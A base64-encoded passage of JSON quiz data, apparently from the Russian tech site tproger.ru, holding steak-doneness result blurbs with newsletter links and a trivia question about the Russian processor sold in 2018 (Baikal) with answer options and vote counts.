0MVx1MDQ0MVx1MDQ0Ylx1MDQzYlx1MDQzYVx1MDQ0MyBcdTAwYWJcdTA0MTBcdTA0NDBcdTA0MzNcdTA0NDNcdTA0M2NcdTA0MzVcdTA0M2RcdTA0NDJcdTA0NGIgXHUwNDM4IFx1MDQ0NFx1MDQ0M1x1MDQzZFx1MDQzYVx1MDQ0Nlx1MDQzOFx1MDQzOFx1MDBiYjxcL2E+IFx1MDQzOCBcdTA0MzFcdTA0NDNcdTA0MzRcdTA0NGNcdTA0NDJcdTA0MzUgXHUwNDMyIFx1MDQzYVx1MDQ0M1x1MDQ0MFx1MDQ0MVx1MDQzNSEifSx7InRpdGxlIjoiXHUwNDFmXHUwNDQwXHUwNDNlXHUwNDQ4XHUwNDMwXHUwNDQwXHUwNDNhXHUwNDMwIE1lZGl1bSBSYXJlIiwiZGVzYyI6IjxkaXYgYWxpZ249XCJjZW50ZXJcIiBzdHlsZT1cIm1hcmdpbi1ib3R0b206IDIwcHg7XCI+PGltZyBzcmM9XCJodHRwczpcL1wvY2RuLnRwcm9nZXIucnVcL3dwLWNvbnRlbnRcL3VwbG9hZHNcLzIwMTlcLzAxXC9tZWRpdW1fcmFyZTEuanBnXCI+PFwvZGl2PlxyXG5cclxuXHUwNDI3XHUwNDQyXHUwNDNlLVx1MDQ0Mlx1MDQzZSBcdTA0MzJcdTA0MzBcdTA0NDhcdTA0MzggXHUwNDM3XHUwNDNkXHUwNDMwXHUwNDNkXHUwNDM4XHUwNDRmIFx1MDQ0MVx1MDQ0Ylx1MDQ0MFx1MDQzZVx1MDQzMlx1MDQzMFx1MDQ0Mlx1MDQ0YiBcdTIwMTQgXHUwNDQ3XHUwNDM4XHUwNDQyXHUwNDMwXHUwNDM5XHUwNDQyXHUwNDM1IFx1MDQzZFx1MDQzMFx1MDQ0OFx1MDQ0MyA8YSBocmVmPVwiaHR0cHM6XC9cL3Rwcm9nZXIucnVcL25ld3NsZXR0ZXJcL1wiIHRhcmdldD1cIl9ibGFua1wiPlx1MDQ0MFx1MDQzMFx1MDQ0MVx1MDQ0MVx1MDQ0Ylx1MDQzYlx1MDQzYVx1MDQ0MyBcdTAwYWJcdTA0MTBcdTA0NDBcdTA0MzNcdTA0NDNcdTA0M2NcdTA0MzVcdTA0M2RcdTA0NDJcdTA0NGIgXHUwNDM4IFx1MDQ0NFx1MDQ0M1x1MDQzZFx1MDQzYVx1MDQ0Nlx1MDQzOFx1MDQzOFx1MDBiYjxcL2E+IFx1MDQzOCBcdTA0M2ZcdTA0NDBcdTA0M2VcdTA0NDhcdTA0MzBcdTA0NDBcdTA0MzhcdTA0MzJcdTA0MzBcdTA0MzlcdTA0NDJcdTA0MzVcdTA0NDFcdTA0NGMhIn0seyJ0aXRsZSI6Ilx1MDQxZlx1MDQ0MFx1MDQzZVx1MDQ0OFx1MDQzMFx1MDQ0MFx1MDQzYVx1MDQzMCBNZWRpdW0gUmFyZSIsImRlc2MiOiI8ZGl2IGFsaWduPVwiY2VudGVyXCIgc3R5bGU9XCJtYXJnaW4tYm90dG9tOiAyMHB4O1wiPjxpbWcgc3JjPVwiaHR0cHM6XC9cL2Nkbi50cHJvZ2VyLnJ1XC93cC1jb250ZW50XC91cGxvYWRzXC8yMDE5XC8wMVwvbWVkaXVtX3JhcmUxLmpwZ1wiPjxcL2Rpdj5cclxuXHJcblx1MDQyN1x1MDQ0Mlx1MDQzZS1cdTA0NDJcdTA0M2UgXHUwNDMyXHUwNDMwXHUwNDQ4XHUwNDM4IFx1MDQzN1x1MDQzZFx1MDQzMFx1MDQzZFx1MDQzOFx1MDQ0ZiBcdTA0NDFcdTA0NGJcdTA0NDBcdTA0M2VcdTA0MzJcdTA0MzBcdTA0NDJcdTA0NGIgXHUyMDE0IFx1MDQ0N1x1MDQzOFx1MDQ0Mlx1MDQzMFx1MDQzOVx1MDQ0Mlx1MDQzNSBcdTA0M2RcdTA0MzBcdTA0NDhcdTA0NDMgPGEgaHJlZj1cImh0dHBzOlwvXC90cHJvZ2VyLnJ1XC9uZXdzbGV0dGVyXC9cIiB0YXJnZXQ9XCJfYmxhbmtcIj5cdTA0NDBcdTA0MzBcdTA0NDFcdTA0NDFcdTA0NGJcdTA0M2JcdTA0M2FcdTA0NDMgXHUwMGFiXHUwNDEwXHUwNDQwXHUwNDMzXHUwNDQzXHUwNDNjXHUwNDM1XHUwNDNkXHUwNDQyXHUwNDRiIFx1MDQzOCBcdTA0NDRcdTA0NDNcdTA0M2RcdTA0M2FcdTA0NDZcdTA0MzhcdTA0MzhcdTAwYmI8XC9hPiBcdTA0MzggXHUwNDNmXHUwNDQwXHUwNDNlXHUwNDQ4XHUwNDMwXHUwNDQwXHUwNDM4XHUwNDMyXHUwNDMwXHUwNDM5XHUwNDQyXHUwNDM1XHUwNDQxXHUwNDRjISJ9LHsidGl0bGUiOiJcdTA0MWZcdTA0NDBcdTA0M2VcdTA0NDhcdTA0MzBcdTA0NDBcdTA0M2FcdTA0MzAgTWVkaXVtIiwiZGVzYyI6IjxkaXYgYWxpZ249XCJjZW50ZXJcIiBzdHlsZT1cIm1hcmdpbi1ib3R0b206IDIwcHg7XCI+PGltZyBzcmM9XCJodHRwczpcL1wvY2RuLnRwcm9nZXIucnVcL3dwLWNvbnRlbnRcL3VwbG9hZHNcLzIwMTlcLzAxXC9tZWRpdW0xLmpwZ1wiPjxcL2Rpdj5cclxuXHJcblx1MDQxZFx1MDQzNVx1MDQzZlx1MDQzYlx1MDQzZVx1MDQ0NVx1MDQzZSwgXHUwNDNkXHUwNDNlIFx1MDQzMlx1MDQzMFx1MDQzYyBcdTA0MzVcdTA0NDlcdTA0NTEgXHUwNDNmXHUwNDQwXHUwNDNlXHUwNDQ4XHUwNDMwXHUwNDQwXHUwNDM4XHUwNDMyXHUwNDMwXHUwNDQyXHUwNDRjXHUwNDQxXHUwNDRmIFx1MDQzOCBcdTA0M2ZcdTA0NDBcdTA0M2VcdTA0NDhcdTA0MzBcdTA0NDBcdTA0MzhcdTA0MzJcdTA0MzBcdTA0NDJcdTA0NGNcdTA0NDFcdTA0NGYuIFx1MDQyN1x1MDQzOFx1MDQ0Mlx1MDQzMFx1MDQzOVx1MDQ0Mlx1MDQzNSBcdTA0M2RcdTA0MzBcdTA0NDhcdTA0NDMgPGEgaHJlZj1cImh0dHBzOlwvXC90cHJvZ2VyLnJ1XC9uZXdzbGV0dGVyXC9cIiB0YXJnZXQ9XCJfYmxhbmtcIj5cdTA0NDBcdTA0MzBcdTA0NDFcdTA0NDFcdTA0NGJcdTA0M2JcdTA0M2FcdTA0NDMgXHUwMGFiXHUwNDEwXHUwNDQwXHUwNDMzXHUwNDQzXHUwNDNjXHUwNDM1XHUwNDNkXHUwNDQyXHUwNDRiIFx1MDQzOCBcdTA0NDRcdTA0NDNcdTA0M2RcdTA0M2FcdTA0NDZcdTA0MzhcdTA0MzhcdTAwYmI8XC9hPiBcdTA0MzggXHUwNDMxXHUwNDQzXHUwNDM0XHUwNDRjXHUwNDQyXHUwNDM1IFx1MDQzMiBcdTA0M2FcdTA0NDNcdTA0NDBcdTA0NDFcdTA0MzUgXHUwNDNkXHUwNDNlXHUwNDMyXHUwNDNlXHUwNDQxXHUwNDQyXHUwNDM1XHUwNDM5IFx1MDQzY1x1MDQzOFx1MDQ0MFx1MDQzMCBJVCEifSx7InRpdGxlIjoiXHUwNDFmXHUwNDQwXHUwNDNlXHUwNDQ4XHUwNDMwXHUwNDQwXHUwNDNhXHUwNDMwIE1lZGl1bSIsImRlc2MiOiI8ZGl2IGFsaWduPVwiY2VudGVyXCIgc3R5bGU9XCJtYXJnaW4tYm90dG9tOiAyMHB4O1wiPjxpbWcgc3JjPVwiaHR0cHM6XC9cL2Nkbi50cHJvZ2VyLnJ1XC93cC1jb250ZW50XC91cGxvYWRzXC8yMDE5XC8wMVwvbWVkaXVtMS5qcGdcIj48XC9kaXY+XHJcblxyXG5cdTA0MWRcdTA0MzVcdTA0M2ZcdTA0M2JcdTA0M2VcdTA0NDVcdTA0M2UsIFx1MDQzZFx1MDQzZSBcdTA0MzJcdTA0MzBcdTA0M2MgXHUwNDM1XHUwNDQ5XHUwNDUxIFx1MDQzZlx1MDQ0MFx1MDQzZVx1MDQ0OFx1MDQzMFx1MDQ0MFx1MDQzOFx1MDQzMlx1MDQzMFx1MDQ0Mlx1MDQ0Y1x1MDQ0MVx1MDQ0ZiBcdTA0MzggXHUwNDNmXHUwNDQwXHUwNDNlXHUwNDQ4XHUwNDMwXHUwNDQwXHUwNDM4XHUwNDMyXHUwNDMwXHUwNDQyXHUwNDRjXHUwNDQxXHUwNDRmLiBcdTA0MjdcdTA0MzhcdTA0NDJcdTA0MzBcdTA0MzlcdTA0NDJcdTA0MzUgXHUwNDNkXHUwNDMwXHUwNDQ4XHUwNDQzIDxhIGhyZWY9XCJodHRwczpcL1wvdHByb2dlci5ydVwvbmV3c2xldHRlclwvXCIgdGFyZ2V0PVwiX2JsYW5rXCI+XHUwNDQwXHUwNDMwXHUwNDQxXHUwNDQxXHUwNDRiXHUwNDNiXHUwNDNhXHUwNDQzIFx1MDBhYlx1MDQxMFx1MDQ0MFx1MDQzM1x1MDQ0M1x1MDQzY1x1MDQzNVx1MDQzZFx1MDQ0Mlx1MDQ0YiBcdTA0MzggXHUwNDQ0XHUwNDQzXHUwNDNkXHUwNDNhXHUwNDQ2XHUwNDM4XHUwNDM4XHUwMGJiPFwvYT4gXHUwNDM4IFx1MDQzMVx1MDQ0M1x1MDQzNFx1MDQ0Y1x1MDQ0Mlx1MDQzNSBcdTA0MzIgXHUwNDNhXHUwNDQzXHUwNDQwXHUwNDQxXHUwNDM1IFx1MDQzZFx1MDQzZVx1MDQzMlx1MDQzZVx1MDQ0MVx1MDQ0Mlx1MDQzNVx1MDQzOSBcdTA0M2NcdTA0MzhcdTA0NDBcdTA0MzAgSVQhIn0seyJ0aXRsZSI6Ilx1MDQxZlx1MDQ0MFx1MDQzZVx1MDQ0OFx1MDQzMFx1MDQ0MFx1MDQzYVx1MDQzMCBNZWRpdW0gV2VsbCIsImRlc2MiOiI8ZGl2IGFsaWduPVwiY2VudGVyXCIgc3R5bGU9XCJtYXJnaW4tYm90dG9tOiAyMHB4O1wiPjxpbWcgc3JjPVwiaHR0cHM6XC9cL2Nkbi50cHJvZ2VyLnJ1XC93cC1jb250ZW50XC91cGxvYWRzXC8yMDE5XC8wMVwvbWVkaXVtX3dlbGwxLmpwZ1wiPjxcL2Rpdj5cclxuXHJcblx1MDQxZVx1MDQzZlx1MDQ0Mlx1MDQzOFx1MDQzY1x1MDQzMFx1MDQzYlx1MDQ0Y1x1MDQzZFx1MDQzZSBcdTA0M2ZcdTA0NDBcdTA0M2VcdTA0NDhcdTA0MzBcdTA0NDBcdTA0MzVcdTA0M2RcdTA0NGIhIFxyXG5cclxuXHUwNDFkXHUwNDNlIFx1MDQzY1x1MDQzZVx1MDQzNlx1MDQzZFx1MDQzZSBcdTA0MzggXHUwNDNiXHUwNDQzXHUwNDQ3XHUwNDQ4XHUwNDM1IFx1MjAxNCBcdTA0NDdcdTA0MzhcdTA0NDJcdTA0MzBcdTA0MzlcdTA0NDJcdTA0MzUgXHUwNDNkXHUwNDMwXHUwNDQ4XHUwNDQzIDxhIGhyZWY9XCJodHRwczpcL1wvdHByb2dlci5ydVwvbmV3c2xldHRlclwvXCIgdGFyZ2V0PVwiX2JsYW5rXCI+XHUwNDQwXHUwNDMwXHUwNDQxXHUwNDQxXHUwNDRiXHUwNDNiXHUwNDNhXHUwNDQzIFx1MDBhYlx1MDQxMFx1MDQ0MFx1MDQzM1x1MDQ0M1x1MDQzY1x1MDQzNVx1MDQzZFx1MDQ0Mlx1MDQ0YiBcdTA0MzggXHUwNDQ0XHUwNDQzXHUwNDNkXHUwNDNhXHUwNDQ2XHUwNDM4XHUwNDM4XHUwMGJiPFwvYT4gXHUwNDM4IFx1MDQzMVx1MDQ0M1x1MDQzNFx1MDQ0Y1x1MDQ0Mlx1MDQzNSBcdTA0MzIgXHUwNDNhXHUwNDQzXHUwNDQwXHUwNDQxXHUwNDM1IFx1MDQzZFx1MDQzZVx1MDQzMlx1MDQzZVx1MDQ0MVx1MDQ0Mlx1MDQzNVx1MDQzOSBcdTA0M2NcdTA0MzhcdTA0NDBcdTA0MzAgSVQhIn0seyJ0aXRsZSI6Ilx1MDQxZlx1MDQ0MFx1MDQzZVx1MDQ0OFx1MDQzMFx1MDQ0MFx1MDQzYVx1MDQzMCBNZWRpdW0gV2VsbCIsImRlc2MiOiI8ZGl2IGFsaWduPVwiY2VudGVyXCIgc3R5bGU9XCJtYXJnaW4tYm90dG9tOiAyMHB4O1wiPjxpbWcgc3JjPVwiaHR0cHM6XC9cL2Nkbi50cHJvZ2VyLnJ1XC93cC1jb250ZW50XC91cGxvYWRzXC8yMDE5XC8wMVwvbWVkaXVtX3dlbGwxLmpwZ1wiPjxcL2Rpdj5cclxuXHJcblx1MDQxZVx1MDQzZlx1MDQ0Mlx1MDQzOFx1MDQzY1x1MDQzMFx1MDQzYlx1MDQ0Y1x1MDQzZFx1MDQzZSBcdTA0M2ZcdTA0NDBcdTA0M2VcdTA0NDhcdTA0MzBcdTA0NDBcdTA0MzVcdTA0M2RcdTA0NGIhIFxyXG5cclxuXHUwNDFkXHUwNDNlIFx1MDQzY1x1MDQzZVx1MDQzNlx1MDQzZFx1MDQzZSBcdTA0MzggXHUwNDNiXHUwNDQzXHUwNDQ3XHUwNDQ4XHUwNDM1IFx1MjAxNCBcdTA0NDdcdTA0MzhcdTA0NDJcdTA0MzBcdTA0MzlcdTA0NDJcdTA0MzUgXHUwNDNkXHUwNDMwXHUwNDQ4XHUwNDQzIDxhIGhyZWY9XCJodHRwczpcL1wvdHByb2dlci5ydVwvbmV3c2xldHRlclwvXCIgdGFyZ2V0PVwiX2JsYW5rXCI+XHUwNDQwXHUwNDMwXHUwNDQxXHUwNDQxXHUwNDRiXHUwNDNiXHUwNDNhXHUwNDQzIFx1MDBhYlx1MDQxMFx1MDQ0MFx1MDQzM1x1MDQ0M1x1MDQzY1x1MDQzNVx1MDQzZFx1MDQ0Mlx1MDQ0YiBcdTA0MzggXHUwNDQ0XHUwNDQzXHUwNDNkXHUwNDNhXHUwNDQ2XHUwNDM4XHUwNDM4XHUwMGJiPFwvYT4gXHUwNDM4IFx1MDQzMVx1MDQ0M1x1MDQzNFx1MDQ0Y1x1MDQ0Mlx1MDQzNSBcdTA0MzIgXHUwNDNhXHUwNDQzXHUwNDQwXHUwNDQxXHUwNDM1IFx1MDQzZFx1MDQzZVx1MDQzMlx1MDQzZVx1MDQ0MVx1MDQ0Mlx1MDQzNVx1MDQzOSBcdTA0M2NcdTA0MzhcdTA0NDBcdTA0MzAgSVQhIn0seyJ0aXRsZSI6Ilx1MDQxZlx1MDQ0MFx1MDQzZVx1MDQ0OFx1MDQzMFx1MDQ0MFx1MDQzYVx1MDQzMCBXZWxsIERvbmUiLCJkZXNjIjoiPGRpdiBhbGlnbj1cImNlbnRlclwiIHN0eWxlPVwibWFyZ2luLWJvdHRvbTogMjBweDtcIj48aW1nIHNyYz1cImh0dHBzOlwvXC9jZG4udHByb2dlci5ydVwvd3AtY29udGVudFwvdXBsb2Fkc1wvMjAxOVwvMDFcL3dlbGxfZG9uZTEuanBnXCI+PFwvZGl2PlxyXG5cclxuXHUwNDIxXHUwNDQwXHUwNDMwXHUwNDM3XHUwNDQzIFx1MDQzMlx1MDQzOFx1MDQzNFx1MDQzZFx1MDQzZSBcdTIwMTQgXHUwNDQxXHUwNDNiXHUwNDM1XHUwNDM0XHUwNDM4XHUwNDQyXHUwNDM1IFx1MDQzN1x1MDQzMCBcdTA0M2RcdTA0M2VcdTA0MzJcdTA0M2VcdTA0NDFcdTA0NDJcdTA0NGZcdTA0M2NcdTA0MzgsIFx1MDQzZVx1MDQ0Mlx1MDQzYlx1MDQzOFx1MDQ0N1x1MDQzZFx1MDQzZSBcdTA0M2ZcdTA0NDBcdTA0M2VcdTA0NDhcdTA0MzBcdTA0NDBcdTA0MzVcdTA0M2RcdTA0NGIhIFx1MDQxZlx1MDQ0MFx1MDQzOFx1MDQzN1x1MDQzZFx1MDQzMFx1MDQzMlx1MDQzMFx1MDQzOVx1MDQ0Mlx1MDQzNVx1MDQ0MVx1MDQ0YywgXHUwNDQ3XHUwNDM4XHUwNDQyXHUwNDMwXHUwNDM1XHUwNDQyXHUwNDM1IFx1MDQzZFx1MDQzMFx1MDQ0OFx1MDQ0MyA8YSBocmVmPVwiaHR0cHM6XC9cL3Rwcm9nZXIucnVcL25ld3NsZXR0ZXJcL1wiIHRhcmdldD1cIl9ibGFua1wiPlx1MDQ0MFx1MDQzMFx1MDQ0MVx1MDQ0MVx1MDQ0Ylx1MDQzYlx1MDQzYVx1MDQ0MyBcdTAwYWJcdTA0MTBcdTA0NDBcdTA0MzNcdTA0NDNcdTA0M2NcdTA0MzVcdTA0M2RcdTA0NDJcdTA0NGIgXHUwNDM4IFx1MDQ0NFx1MDQ0M1x1MDQzZFx1MDQzYVx1MDQ0Nlx1MDQzOFx1MDQzOFx1MDBiYjxcL2E+PyJ9LHsidGl0bGUiOiJcdTA0MWZcdTA0NDBcdTA0M2VcdTA0NDhcdTA0MzBcdTA0NDBcdTA0M2FcdTA0MzAgV2VsbCBEb25lIiwiZGVzYyI6IjxkaXYgYWxpZ249XCJjZW50ZXJcIiBzdHlsZT1cIm1hcmdpbi1ib3R0b206IDIwcHg7XCI+PGltZyBzcmM9XCJodHRwczpcL1wvY2RuLnRwcm9nZXIucnVcL3dwLWNvbnRlbnRcL3VwbG9hZHNcLzIwMTlcLzAxXC93ZWxsX2RvbmUxLmpwZ1wiPjxcL2Rpdj5cclxuXHJcblx1MDQyMVx1MDQ0MFx1MDQzMFx1MDQzN1x1MDQ0MyBcdTA0MzJcdTA0MzhcdTA0MzRcdTA0M2RcdTA0M2UgXHUyMDE0IFx1MDQ0MVx1MDQzYlx1MDQzNVx1MDQzNFx1MDQzOFx1MDQ0Mlx1MDQzNSBcdTA0MzdcdTA0MzAgXHUwNDNkXHUwNDNlXHUwNDMyXHUwNDNlXHUwNDQxXHUwNDQyXHUwNDRmXHUwNDNjXHUwNDM4LCBcdTA0M2VcdTA0NDJcdTA0M2JcdTA0MzhcdTA0NDdcdTA0M2RcdTA0M2UgXHUwNDNmXHUwNDQwXHUwNDNlXHUwNDQ4XHUwNDMwXHUwNDQwXHUwNDM1XHUwNDNkXHUwNDRiISBcdTA0MWZcdTA0NDBcdTA0MzhcdTA0MzdcdTA0M2RcdTA0MzBcdTA0MzJcdTA0MzBcdTA0MzlcdTA0NDJcdTA0MzVcdTA0NDFcdTA0NGMsIFx1MDQ0N1x1MDQzOFx1MDQ0Mlx1MDQzMFx1MDQzNVx1MDQ0Mlx1MDQzNSBcdTA0M2RcdTA0MzBcdTA0NDhcdTA0NDMgPGEgaHJlZj1cImh0dHBzOlwvXC90cHJvZ2VyLnJ1XC9uZXdzbGV0dGVyXC9cIiB0YXJnZXQ9XCJfYmxhbmtcIj5cdTA0NDBcdTA0MzBcdTA0NDFcdTA0NDFcdTA0NGJcdTA0M2JcdTA0M2FcdTA0NDMgXHUwMGFiXHUwNDEwXHUwNDQwXHUwNDMzXHUwNDQzXHUwNDNjXHUwNDM1XHUwNDNkXHUwNDQyXHUwNDRiIFx1MDQzOCBcdTA0NDRcdTA0NDNcdTA0M2RcdTA0M2FcdTA0NDZcdTA0MzhcdTA0MzhcdTAwYmI8XC9hPj8ifSx7InRpdGxlIjoiXHUwNDFhXHUwNDNlXHUwNDQyXHUwNDNiXHUwNDM1XHUwNDQyXHUwNDNhXHUwNDM4IFx1MDQ0MSBcdTA0M2ZcdTA0NGVcdTA0NDBcdTA0MzVcdTA0NDhcdTA0M2FcdTA0M2VcdTA0MzkiLCJkZXNjIjoiPGRpdiBhbGlnbj1cImNlbnRlclwiIHN0eWxlPVwibWFyZ2luLWJvdHRvbTogMjBweDtcIj48aW1nIHNyYz1cImh0dHBzOlwvXC9jZG4udHByb2dlci5ydVwvd3AtY29udGVudFwvdXBsb2Fkc1wvMjAxOVwvMDFcL2Jlc3QuanBnXCI+PFwvZGl2PlxyXG5cclxuXHUwNDFmXHUwNDNlXHUwNDQyXHUwNDNlXHUwNDNjXHUwNDQzIFx1MDQ0N1x1MDQ0Mlx1MDQzZSBcdTA0M2RcdTA0MzVcdTA0NDIgXHUwNDNkXHUwNDM4XHUwNDQ3XHUwNDM1XHUwNDMzXHUwNDNlIFx1MDQzYlx1MDQ0M1x1MDQ0N1x1MDQ0OFx1MDQzNSBcdTA0MzJcdTA0M2RcdTA0MzhcdTA0M2NcdTA0MzBcdTA0NDJcdTA0MzVcdTA0M2JcdTA0NGNcdTA0M2RcdTA0NGJcdTA0NDUgXHUwNDQ3XHUwNDM4XHUwNDQyXHUwNDMwXHUwNDQyXHUwNDM1XHUwNDNiXHUwNDM1XHUwNDM5IFx1MDQzOCBcdTA0M2FcdTA0M2VcdTA0NDJcdTA0M2JcdTA0MzVcdTA0NDJcdTA0M2VcdTA0M2EgXHUwNDQxIFx1MDQzZlx1MDQ0ZVx1MDQ0MFx1MDQzNVx1MDQ0OFx1MDQzYVx1MDQzZVx1MDQzOSA6KSJ9LHsidGl0bGUiOiIiLCJkZXNjIjoiIn0seyJ0aXRsZSI6IiIsImRlc2MiOiIifSx7InRpdGxlIjoiIiwiZGVzYyI6IiJ9LHsidGl0bGUiOiIiLCJkZXNjIjoiIn0seyJ0aXRsZSI6IiIsImRlc2MiOiIifSx7InRpdGxlIjoiIiwiZGVzYyI6IiJ9LHsidGl0bGUiOiIiLCJkZXNjIjoiIn0seyJ0aXRsZSI6IiIsImRlc2MiOiIifSx7InRpdGxlIjoiIiwiZGVzYyI6IiJ9LHsidGl0bGUiOiIiLCJkZXNjIjoiIn1dLCJxdWVzdGlvbnMiOlt7ImlkIjoiNTI4IiwidGV4dCI6IjxwPlx1MDQxYVx1MDQzMFx1MDQzYSBcdTA0M2RcdTA0MzBcdTA0MzdcdTA0NGJcdTA0MzJcdTA0MzBcdTA0MzVcdTA0NDJcdTA0NDFcdTA0NGYgXHUwNDQwXHUwNDNlXHUwNDQxXHUwNDQxXHUwNDM4XHUwNDM5XHUwNDQxXHUwNDNhXHUwNDM4XHUwNDM5IFx1MDQzZlx1MDQ0MFx1MDQzZVx1MDQ0Nlx1MDQzNVx1MDQ0MVx1MDQ0MVx1MDQzZVx1MDQ0MCwgXHUwNDNmXHUwNDNlXHUwNDQxXHUwNDQyXHUwNDQzXHUwNDNmXHUwNDM4XHUwNDMyXHUwNDQ4XHUwNDM4XHUwNDM5IFx1MDQzMiBcdTA0NDFcdTA0MzJcdTA0M2VcdTA0MzFcdTA0M2VcdTA0MzRcdTA0M2RcdTA0NDNcdTA0NGUgXHUwNDNmXHUwNDQwXHUwNDNlXHUwNDM0XHUwNDMwXHUwNDM2XHUwNDQzIFx1MDQzMiAyMDE4IFx1MDQzM1x1MDQzZVx1MDQzNFx1MDQ0Mz88XC9wPlxuIiwicXVpel9pZCI6IjY0Iiwidm90ZWQiOiIxNDk2IiwiYW5zd2VyX3R5cGUiOiJjaXJjbGUiLCJhbnN3ZXJzIjpbeyJpZCI6IjE4NjUiLCJxdWVzdGlvbl9pZCI6IjUyOCIsInRleHQiOiJcdTA0MmRcdTA0M2JcdTA0NGNcdTA0MzFcdTA0NDBcdTA0NDNcdTA0NDEiLCJkZXNjciI6IjxwPlx1MDQxZFx1MDQzNVx1MDQ0MiwgXHUwMGFiXHUwNDJkXHUwNDNiXHUwNDRjXHUwNDMxXHUwNDQwXHUwNDQzXHUwNDQxXHUwMGJiIFx1MDQzZlx1MDQzZVx1MDQ0Zlx1MDQzMlx1MDQzOFx1MDQzYlx1MDQ0MVx1MDQ0ZiBcdTA0MzIgMjAxNiBcdTA0MzNcdTA0M2VcdTA0MzRcdTA0NDMuIFx1MDQxMCBcdTA0M2JcdTA0MzVcdTA0NDJcdTA0M2VcdTA0M2MgMjAxOCBcdTA0MzNcdTA0M2VcdTA0MzRcdTA0MzAgXHUwNDMyIFx1MDQzZlx1MDQ0MFx1MDQzZVx1MDQzNFx1MDQzMFx1MDQzNlx1MDQ0MyBcdTA0MzJcdTA0NGJcdTA0NDhcdTA0MzVcdTA0M2IgPGEgaHJlZj1cImh0dHBzOlwvXC90cHJvZ2VyLnJ1XC9uZXdzXC9iYWlrYWwtaW4tcmV0YWlsXC9cIiB0YXJnZXQ9XCJfYmxhbmtcIiByZWw9XCJub2ZvbGxvdyBub29wZW5lciBub3JlZmVycmVyXCI+XHUwMGFiXHUwNDExXHUwNDMwXHUwNDM5XHUwNDNhXHUwNDMwXHUwNDNiXHUwMGJiPFwvYT4uPFwvcD5cbiIsImNvcnJlY3QiOiIwIiwidm90ZWQiOiI4MDYiLCJmb3JfcmVzdWx0IjoiLTEifSx7ImlkIjoiMTg2NiIsInF1ZXN0aW9uX2lkIjoiNTI4IiwidGV4dCI6Ilx1MDQxMVx1MDQzMFx1MDQzOVx1MDQzYVx1MDQzMFx1MDQzYiIsImRlc2NyIjoiPHA+XHUwNDE0XHUwNDMwLCBcdTA0MzJcdTA0NDFcdTA0NTEgXHUwNDQyXHUwNDMwXHUwNDNhLiBcdTA0MWZcdTA0NDBcdTA0M2VcdTA0NDZcdTA0MzVcdTA0NDFcdTA0NDFcdTA0M2VcdTA0NDAgPGEgaHJlZj1cImh0dHBzOlwvXC90cHJvZ2VyLnJ1XC9uZXdzXC9iYWlrYWwtaW4tcmV0YWlsXC9cIiB0YXJnZXQ9XCJfYmxhbmtcIiByZWw9XCJub2ZvbGxvdyBub29wZW5lciBub3JlZmVycmVyXCI+XHUwNDQxXHUwNDQyXHUwNDNlXHUwNDM4XHUwNDNiPFwvYT4gMzkgOTAwIFx1MjBiZC48XC9wPlxuIiwiY29ycmVjdCI6IjEiLCJ2b3RlZCI6IjU4MCIsImZvcl9yZXN1bHQiOiItMSJ9LHsiaWQiOiIxODY3IiwicXVlc3Rpb25faWQiOiI1MjgiLCJ0ZXh0IjoiXHUwNDFmXHUwNDNlXHUwNDMxXHUwNDM1XHUwNDM0XHUwNDMwIiwiZGVzY3IiOiI8cD5cdTA0MWRcdTA0MzVcdTA0NDIsIFx1MDQzZFx1MDQzZSBcdTA0M2ZcdTA0NDBcdTA0M2VcdTA0NDZcdTA0MzVcdTA0NDFcdTA0NDFcdTA0M2VcdTA0NDAtXHUwNDNiXHUwNDNlXHUwNDQzXHUwNDNhXHUwNDNlXHUwNDQxXHUwNDQyXHUwNDM1XHUwNDQwIFx1MjAxNCBcdTA0NGRcdTA0NDJcdTA0M2UgXHUwNDM4XHUwNDNkXHUwNDQyXHUwNDM1XHUwNDQwXHUwNDM1XHUwNDQxXHUwNDNkXHUwNDNlLiBcdTA0MWZcdTA0NDBcdTA0MzBcdTA0MzJcdTA0MzhcdTA0M2JcdTA0NGNcdTA0M2RcdTA0NGJcdTA0MzkgXHUwNDNlXHUwNDQyXHUwNDMyXHUwNDM1XHUwNDQyIFx1MjAxNCA8YSBocmVmPVwiaHR0cHM6XC9cL3Rwcm9nZXIucnVcL25ld3NcL2JhaWthbC1pbi1yZXRhaWxcL1wiIHRhcmdldD1cIl9ibGFua1wiIHJlbD1cIm5vZm9sbG93IG5vb3BlbmVyIG5vcmVmZXJyZXJcIj5cdTAwYWJcdTA0MTFcdTA0MzBcdTA0MzlcdTA0M2FcdTA0MzBcdTA0M2JcdTAwYmI8XC9hPi48XC9wPlxuIiwiY29ycmVjdCI6IjAiLCJ2b3RlZCI6IjQ5IiwiZm9yX3Jlc3VsdCI6Ii0xIn0seyJpZCI6IjE5MDIiLCJxdWVzdGlvbl9pZCI6IjUyOCIsInRleHQiOiJcdTA0MTJcdTA0M2VcdTA0M2JcdTA0MzNcdTA0MzAtMjAxOCIsImRlc2NyIjoiPHA+XHUwNDFkXHUwNDM1XHUwNDQyLCBcdTA0NDJcdTA0MzBcdTA0M2FcdTA0M2VcdTA0MzNcdTA0M2UgXHUwNDNmXHUwNDQwXHUwNDNlXHUwNDQ2XHUwNDM1XHUwNDQxXHUwNDQxXHUwNDNlXHUwNDQwXHUwNDMwIFx1MDQzZFx1MDQzNVx1MDQ0MiBcdTA0MzJcdTA0M2VcdTA0M2VcdTA0MzFcdTA0NDlcdTA0MzUuIFx1MDQxZlx1MDQ0MFx1MDQzMFx1MDQzMlx1MDQzOFx1MDQzYlx1MDQ0Y1x1MDQzZFx1MDQ0Ylx1MDQzOSBcdTA0M2VcdTA0NDJcdTA0MzJcdTA0MzVcdTA0NDIgXHUyMDE0IDxhIGhyZWY9XCJodHRwczpcL1wvdHByb2dlci5ydVwvbmV3c1wvYmFpa2FsLWluLXJldGFpbFwvXCIgdGFyZ2V0PVwiX2JsYW5rXCIgcmVsPVwibm9mb2xsb3cgbm9vcGVuZXIgbm9yZWZlcnJlclwiPlx1MDBhYlx1MDQxMVx1MDQzMFx1MDQzOVx1MDQzYVx1MDQzMFx1MDQzYlx1MDBiYjxcL2E+LjxcL3A+XG4iLCJjb3JyZWN0IjoiMCIsInZvdGVkIjoiNjAiLCJmb3JfcmVzdWx0IjoiLTEifV19LHsiaWQiOiI1MjkiLCJ0ZXh0IjoiPHA+XHUwNDE4XHUwNDM3IFx1MDQzYVx1MDQzMFx1MDQzYVx1MDQzZVx1MDQzOSBcdTA0M2FcdTA0M2VcdTA0M2NcdTA0M2ZcdTA0MzBcdTA0M2RcdTA0MzhcdTA0MzggXHUwNDMyIDIwMTggXHUwNDMzXHUwNDNlXHUwNDM0XHUwNDQzIFx1MDQzZFx1MDQzNSBcdTAwYWJcdTA0NDNcdTA0NDJcdT